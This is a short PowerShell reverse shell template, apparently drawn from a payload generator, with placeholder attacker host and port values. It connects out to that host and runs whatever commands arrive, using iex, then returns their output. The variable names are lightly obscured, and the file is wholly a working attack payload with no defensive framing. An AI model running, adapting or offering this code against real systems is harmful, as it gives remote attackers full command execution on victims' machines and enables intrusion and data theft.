# does not support interactive commands
$aaaa = New-Object System.Net.Sockets.TCPClient("{{ LHOST }}", {{ LPORT }})
$bbbb = $aaaa.GetStream()
[byte[]]$cccc = 0..65535|%{0}
while (($ffff = $bbbb.Read($cccc, 0, $cccc.Length)) -ne 0) {
    $gggg = New-Object -TypeName System.Text.ASCIIEncoding
    $dddd = $gggg.GetString($cccc, 0, $ffff)
    $hhhh = (iex $dddd 2>&1 | Out-String)
    $eeee = ([text.encoding]::ASCII).GetBytes($hhhh + (pwd).Path + "> ")
    $bbbb.Write($eeee, 0, $eeee.Length)
    $bbbb.Flush()
}
$aaaa.Close()
